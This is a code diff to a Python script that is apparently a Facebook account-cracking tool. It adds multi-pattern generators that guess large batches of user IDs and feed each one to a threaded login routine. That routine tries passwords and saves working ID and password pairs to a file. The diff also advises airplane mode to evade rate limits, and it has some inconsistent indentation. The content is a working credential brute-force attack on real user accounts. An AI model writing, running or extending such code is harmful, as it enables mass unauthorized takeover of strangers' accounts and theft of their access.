@@ -667,12 +667,15 @@ def main():
 	clear()
 	print(f'\33[38;5;160m[\033[1;97m1\33[38;5;160m] \033[1;97mRandom Method\33[38;5;160m[\33[38;5;37m2009\33[38;5;160m/\33[38;5;37m2012\33[38;5;160m]\033[1;97m')
 	linex()
+	print(f'\33[38;5;160m[\033[1;97m1\33[38;5;160m] \033[1;97mAdvanced Random Method\33[38;5;160m[\33[38;5;37m2004-2005\33[38;5;160m/\33[38;5;37m2008-2010\33[38;5;160m]\033[1;97m')
+    linex()
 	ch = input(f'\33[38;5;160m[\033[1;97m✅\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160m▶ \033[1;97m')
 	if ch in ('1','01','11','A','১','০১','a','A'):
 		__Random_Method__()
- 
+    elif ch in ('2','02','22','B','২','০২','b','B'):
+        __Advanced_Random_Method__()
+      
 
-        
 def __Random_Method__():
     user=[]
     clear()
@@ -680,19 +683,141 @@ def __Random_Method__():
     linex()
     limit=input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
     linex()
-    year_code = '10000'
+    
+    # Advanced year code generation
+    current_year = datetime.now().year
+    year_codes = []
+    
+    # Create multiple year ranges for better distribution
+    popular_years = ['10000', '10001', '10002', '10003', '10004', '10005']  # Very popular
+    old_years = [str(year) for year in range(10006, 15000)]  # Old accounts
+    mid_years = [str(year) for year in range(15000, 20000)]  # Mid range
+    recent_years = [str(year) for year in range(2008, current_year + 1)]  # Recent years
+    
+    # Weighted distribution (more popular years get higher chance)
+    weighted_years = (popular_years * 10 +  # 10x chance for popular
+                     old_years * 3 +        # 3x chance for old
+                     mid_years * 2 +        # 2x chance for mid
+                     recent_years * 5)      # 5x chance for recent
+    
+    # Generate mixed patterns
     for i in range(int(limit)):
-    	data=str(random.choice(range(1000000000,1999999999)));user.append(data)
+        # Multiple ID generation patterns
+        pattern = random.choice(['standard', 'reverse', 'mixed', 'birth_year', 'sequential'])
+        
+        if pattern == 'standard':
+            year_code = random.choice(weighted_years)
+            data = str(random.choice(range(1000000000, 1999999999)))
+            uid = year_code + data
+            
+        elif pattern == 'reverse':
+            year_code = random.choice(weighted_years)
+            data = str(random.choice(range(1000000000, 1999999999)))
+            uid = data + year_code  # Reverse pattern
+            
+        elif pattern == 'mixed':
+            year_code = random.choice(weighted_years)
+            data1 = str(random.choice(range(100000, 999999)))
+            data2 = str(random.choice(range(1000, 9999)))
+            uid = year_code + data1 + data2
+            
+        elif pattern == 'birth_year':
+            # Realistic birth years (1960-2010)
+            birth_year = str(random.choice(range(1960, 2010)))
+            month = str(random.choice(range(1, 13))).zfill(2)
+            day = str(random.choice(range(1, 29))).zfill(2)
+            extra = str(random.choice(range(100000, 999999)))
+            uid = birth_year + month + day + extra
+            
+        elif pattern == 'sequential':
+            base_year = random.choice(weighted_years)
+            sequence = str(random.choice(range(1000000, 9999999)))
+            random_end = str(random.choice(range(100, 999)))
+            uid = base_year + sequence + random_end
+        
+        # Ensure unique IDs
+        if uid not in user:
+            user.append(uid)
+        else:
+            # If duplicate, generate a simple fallback
+            fallback_year = random.choice(weighted_years)
+            fallback_data = str(random.choice(range(1000000000, 1999999999)))
+            user.append(fallback_year + fallback_data)
+    
+    # Shuffle the list for randomness
+    random.shuffle(user)
+    
     with tred(max_workers=30) as jihad:
         clear()
         print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mTOTAL ID \33[38;5;46m▶ \033[1;97m{limit}')
         print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ')
+        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYEAR RANGE \33[38;5;46m▶ \033[1;97m10000-{current_year} + Birth Years')
+        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mPATTERNS \33[38;5;46m▶ \033[1;97m5 Different ID Patterns')
         linex()
-        for mal in user:
-            uid=year_code+mal
-            jihad.submit(login1,uid)
-    line();print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!');linex();print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m');main()
+        for uid in user:
+            jihad.submit(login1, uid)
+    
+    line()
+    print(f'\r\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;46m!')
+    linex()
+    print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}')
+    linex()
+    input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;46m!\033[1;37m')
+    main()
 
+
+# Alternative strong method with even more patterns
+def __Advanced_Random_Method__():
+    user=[]
+    clear()
+    print(f'\33[38;5;46m[\033[1;97m🔥\33[38;5;46m] \033[1;97mADVANCED MODE \33[38;5;46m▶ \033[1;97mMULTI-PATTERN GENERATOR')
+    print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mEXAMPLE \33[38;5;46m  ▶ \033[1;97m10000\33[38;5;37m|\033[1;97m50000\33[38;5;37m|\033[1;97m100000')
+    linex()
+    limit=input(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mSELECTION \33[38;5;46m▶ \033[1;97m')
+    linex()
+    
+    # Super advanced generation
+    patterns = {
+        'classic': lambda: random.choice(['10000', '10001', '10002']) + str(random.randint(1000000000, 1999999999)),
+        'birth_based': lambda: str(random.randint(1970, 2005)) + str(random.randint(101, 1231)).zfill(4) + str(random.randint(100000, 999999)),
+        'phone_like': lambda: str(random.randint(10000, 99999)) + str(random.randint(1000000, 9999999)),
+        'mixed_reverse': lambda: str(random.randint(1000000, 9999999)) + str(random.randint(10000, 25000)),
+        'double_year': lambda: str(random.randint(10000, 25000)) + str(random.randint(1990, 2010)) + str(random.randint(100000, 999999)),
+        'random_strong': lambda: ''.join([str(random.randint(0, 9)) for _ in range(random.randint(13, 15))])
+    }
+    
+    for i in range(int(limit)):
+        # Randomly select pattern
+        pattern_name = random.choice(list(patterns.keys()))
+        uid = patterns[pattern_name]()
+        
+        # Ensure minimum length
+        if len(uid) < 11:
+            uid += str(random.randint(100, 999))
+            
+        user.append(uid)
+    
+    # Remove duplicates and shuffle
+    user = list(set(user))
+    random.shuffle(user)
+    
+    with tred(max_workers=30) as jihad:
+        clear()
+        print(f'\33[38;5;46m[\033[1;97m🔥\33[38;5;46m] \033[1;97mADVANCED MODE ACTIVATED')
+        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mTOTAL ID \33[38;5;46m▶ \033[1;97m{len(user)}')
+        print(f'\33[38;5;46m[\033[1;97m✅\33[38;5;46m] \033[1;97mPATTERNS \33[38;5;46m▶ \033[1;97m6 Advanced Patterns')
+        print(f'\33[38;5;46m[\033[1;97m⚡\33[38;5;46m] \033[1;97mSTRONG GENERATION ENABLED')
+        linex()
+        for uid in user:
+            jihad.submit(login1, uid)
+    
+    line()
+    print(f'\r\33[38;5;46m[\033[1;97m🎯\33[38;5;46m] \033[1;97mADVANCED CRACKING COMPLETED!\33[38;5;46m!')
+    linex()
+    print(f'\r\r\r\r\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mTOTAL OK \33[38;5;46m▶ \x1b[38;5;46m{len(oks)}')
+    linex()
+    input(f'\33[38;5;46m[\033[1;97mᯤ\33[38;5;46m] \033[1;97mPRESS ENTER TO CONTINUE...\33[38;5;46m!\033[1;37m')
+    main()
 def login1(uid):
     global oks,loop,cps
     Session=requests.session()
@@ -744,12 +869,12 @@ def login1(uid):
             if "session_key" in rp:            	
                 print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaazm\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
                 open("/sdcard/Maaz-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
-                cps.append(uid)
+                oks.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;260mCP\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked CP id,"')
                 open("/sdcard/Maaz-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
-                oks.append(uid)
+                cps.append(uid)
                 break
             else:continue
         loop+=1
